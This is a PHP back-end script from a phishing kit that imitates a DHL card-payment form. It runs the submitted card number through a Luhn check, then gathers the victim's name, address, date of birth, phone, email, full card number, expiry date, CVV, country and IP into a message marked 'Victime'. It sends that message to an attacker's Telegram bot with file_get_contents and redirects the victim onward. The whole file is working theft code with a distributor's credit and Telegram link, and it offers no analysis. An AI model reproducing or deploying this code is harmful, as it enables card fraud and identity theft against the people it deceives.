<?php
session_start();
//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../AlexRony/911.php');
include('../AlexRony/COUNTRY.php');
include('../AlexRony/SYS.php');
include('../AlexRony/TELEGRMAT.php');
include('../AlexRony/BIN.php');

function validateCardNumber($number) {
    $number = preg_replace('/\D/', '', $number);

    $length = strlen($number);
    if ($length < 15 || $length > 16) {
        return false;
    }

    $sum = 0;
    for ($i = 0; $i < $length; $i++) {
        $digit = (int) $number[$i];
        if (($length - $i) % 2 == 0) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return $sum % 10 == 0;
}

if (isset($_POST['submit'])) {
    if (validateCardNumber($_POST['one'])) {
        header("Location: ../Loa.php?FGDD=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch"); 
    } else {
        header("Location: ../B.php?error=invalidCardNumber"); 
        exit(); // توقف عن تنفيذ السكريبت هنا
    }
    $message  = "|=====🔋/FULL-INFOS\🔋=====|" . "\n";
    $message .= "| Full-Name: " . $_SESSION['full'] . "\n";
    $message .= "| Address: " . $_SESSION['adress'] . "\n";
    $message .= "| City: " . $_SESSION['city'] . "\n";
    $message .= "| Zip-code: " . $_SESSION['zip'] . "\n";
    $message .= "| DOB: " . $_SESSION['dob'] . "\n";
    $message .= "| Phone-Number: " . $_SESSION['phone'] . "\n";
    $message .= "| E-mail: " . $_SESSION['email'] . "\n";
    $message .= "|=====/💰DHL-CARD💰\=====|" . "\n";
    $message .= "| * Holder-Name: " . $_POST['full'] . "\n";
    $message .= "| * Carte Number: " . str_replace(' ','',$_POST['one']) . "\n";
    $message .= "| * Date Experation: " . $_POST['two'] . "\n";
    $message .= "| * CVV Code: " . $_POST['three'] . "\n";
	
	$message .= "|=====/💰END-INFOS💰\=====|" . "\n";
    $message .= "| + Victime country: ".$get_user_country. "\n";
    $message .= "| + Victime IP: ".$ip."\n";
    $message .= "|==========/🔰\========|";



    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
}
?>